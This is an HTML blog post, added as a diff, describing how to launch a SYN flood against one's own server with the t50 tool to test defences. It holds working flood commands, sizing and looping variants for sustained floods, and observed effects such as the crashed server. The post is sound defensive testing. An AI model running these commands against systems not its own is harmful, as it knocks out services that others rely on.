@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<meta name="author" content="Chase Pettet">
+<meta name="description" content="notes and useful(?) things">
+<meta name="generator" content="mynt v0.2.3">
+
+<link rel="shortcut icon" href="/assets/images/favicon.ico" type="image/x-icon">
+
+<link rel="alternate" href="/feed.xml" type="application/atom+xml">
+
+<link rel="stylesheet" href="/assets/css/screen.css" type="text/css">
+<link rel="stylesheet" href="/assets/css/pygments.css" type="text/css">
+
+
+    <script type="text/javascript">
+        var _gaq = _gaq || [];
+        _gaq.push(['_setAccount', 'UA-40840221-1']);
+        _gaq.push(['_trackPageview']);
+        
+        (function() {
+            var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+            ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+            var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+        })();
+    </script>
+
+    
+    <title>launching a syn flood test &ndash; devops type thoughts</title>
+</head>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.4.4/jquery.min.js"></script>
+<script type="text/javascript">
+
+function toggleDiv(divId) {
+   $("#"+divId).toggle();
+}
+</script>
+
+<style type="text/css">
+<!--
+#nav ul li a {
+    color:white;
+}
+
+#nav ul li a:hover {color: blue;}
+-->
+</style>
+
+<body>
+    <div id="container">
+        <div id="nav">
+            <ul>
+                <li><a href="/about/">About</a></li>
+                <li><a href="/">Blog</a></li>
+                <li><a href="/archives/">Archives</a></li>
+                <li><a href="/useful/">Useful</a></li>
+                <li><a href="/feed.xml">Feed</a></li>
+            </ul>
+            
+            
+                <ul id="social">
+                    
+                    
+                    <li><a href="https://github.com/chasemp"><img src="/assets/images/social/github.png" width="16" height="16" alt="GitHub"></a></li>
+                    
+                    
+                    <li><a href="http://stackoverflow.com/users/chasemp"><img src="/assets/images/social/stack-overflow.png" width="16" height="16" alt="Stack Overflow"></a></li>
+                    
+                    
+                </ul>
+            
+        </div>
+        
+        <div id="header">
+            <h1><a href="/">devops type thoughts</a></h1>
+            
+        </div>
+        
+        <div id="content">
+            
+    <div class="item">
+        <div class="header">
+            <h1>launching a syn flood test</h1>
+            <h2>Wednesday, May 29, 2013 <span>&raquo;</span> <a href="/tags/opsec/">opsec</a>, <a href="/tags/tcp/">tcp</a></h2>
+        </div>
+        
+        <div class="body">
+            <h4>Preamble</h4>
+<p>Launching a SYN flood.</p>
+
+<p>Everyone know DDOS attacks happen and of these SYN floods may be the simplest to organize for attackers.  As a defender you don&#39;t want the first time you see this kind of traffic to be when you are under attack.</p>
+<h4>Launching a SYN attack against yourself.</h4>
+<ol>
+<li>You can learn some tools of the trade</li>
+<li>You can test the weakness of your services</li>
+<li>You can mitigate those weaknesses</li>
+</ol>
+<h4>Picking a tool</h4>
+<p>A tool that is simple to use is <a href="https://github.com/merces/t50">t50</a></p>
+<pre><code>git clone https:&#47;&#47;github.com&#47;merces&#47;t50.git
+cd t50&#47;
+make
+.&#47;t50 --help
+</code></pre>
+<p>Now you have a compiled attack tool and the help is pretty large.  </p>
+<h4>Launching a SYN Flood</h4><pre><code>.&#47;t50 &lt;DEST_IP&gt; --flood -S --turbo
+</code></pre><h4>Looks like</h4>
+<p>Start:</p>
+<pre><code>entering in flood mode...
+activating turbo...
+hit CTRL+C to break.
+</code></pre>
+<p>Finish:    </p>
+<pre><code>T50 5.4.1 successfully launched on May 28th 2013 13:09:24
+</code></pre><h4>n the destination host:</h4>
+<ul>
+<li>Traffic:</li>
+</ul>
+
+<pre><code>
+    tx eth0: 1168 b/s rx eth0: 528 b/s
+    tx eth0: 1056 b/s rx eth0: 9160 b/s
+    tx eth0: 8616 b/s rx eth0: 528 b/s
+    tx eth0: 4944 b/s rx eth0: 528 b/s
+
+        *syn flood starts**
+
+    tx eth0: 10 Mb/s rx eth0: 12 Mb/s
+    tx eth0: 36 Mb/s rx eth0: 43 Mb/s
+    tx eth0: 38 Mb/s rx eth0: 46 Mb/s
+    tx eth0: 39 Mb/s rx eth0: 47 Mb/s
+    tx eth0: 39 Mb/s rx eth0: 47 Mb/s
+</code></pre>
+
+<ul>
+<li>Logging (NOTE: SYN Cookies are enabled)</li>
+</ul>
+
+<pre><code>
+    possible SYN flooding on port 5666. Sending cookies.
+    possible SYN flooding on port 5666. Sending cookies.
+</code></pre>
+
+<ul>
+<li>Connection Table</li>
+</ul>
+
+<pre><code>
+    while true; do netstat -n -p TCP tcp | grep  SYN_RECV | wc -l >> /tmp/syn.log; sleep 2; done
+
+    0
+    5
+    6
+    3
+    2
+    ...
+    **syn flood**
+    ...
+    142
+    140
+    144
+    143
+    142
+    142
+    143
+    142
+    141
+    141
+    140
+    137
+    138
+    140
+    142
+    142
+    142
+    145
+    144
+</code></pre>
+
+<p>Effect:</p>
+
+<ul>
+<li>Massive lag in responsiveness for CLI commands</li>
+<li>Simple web server with (python -m SimpleHTTPServer) crashed</li>
+<li>Top shows ksoftirqd/0 pegging CPU</li>
+</ul>
+
+<p>Guidance on size of flood:</p>
+<pre><code>.&#47;t50 &lt;target&gt; --threshold 10000 -S #4Mbps
+.&#47;t50 &lt;target&gt; --threshold 20000 -S #8Mbps
+.&#47;t50 &lt;target&gt; --threshold 40000 -S #16Mbps
+
+#more or less consisten 4Mbps flood
+for i in {1..100}; do .&#47;t50 &lt;target&gt; --threshold 10000 -S; sleep 3; done
+</code></pre><h4>Reference:</h4>
+<p><a href="http://antmeetspenguin.blogspot.com/2011/01/detecting-and-preventing-syn-flood.html">dealing with syn flood blog post</a><br>
+<a href="http://www.sans.org/security-resources/idfaq/syn_flood.php">sans on syn flood</a><br>
+<a href="http://www.cs.wm.edu/%7Ehnw/paper/attack.pdf">syn flood attack paper</a><br>
+<a href="http://serverfault.com/questions/294209/possible-syn-flooding-in-log-despite-low-number-of-syn-recv-connections">sf syn flood info</a><br>
+<a href="http://pc-freak.net/blog/how-to-check-if-your-linux-webserver-is-under-a-dos-attack/">am I under ddos?</a><br>
+<a href="https://github.com/merces/t50">t50 gh</a><br>
+<a href="http://www.gossamer-threads.com/lists/fulldisc/full-disclosure/77770?do=post_view_threaded">fulldisclosure info</a><br>
+<a href="http://www.cisco.com/web/about/ac123/ac147/archived_issues/ipj_9-4/syn_flooding_attacks.html">cisco on syn floods</a><br>
+<a href="http://h4xors.wordpress.com/tag/t50/">t50 info</a></p>
+
+        </div>
+    </div>
+
+        </div>
+        
+        <div id="footer">
+            <p>Copyright &copy; 2015 Chase Pettet &ndash; powered by <a href="http://mynt.mirroredwhite.com/">mynt</a></p>
+        </div>
+    </div>
+</body>
+</html>
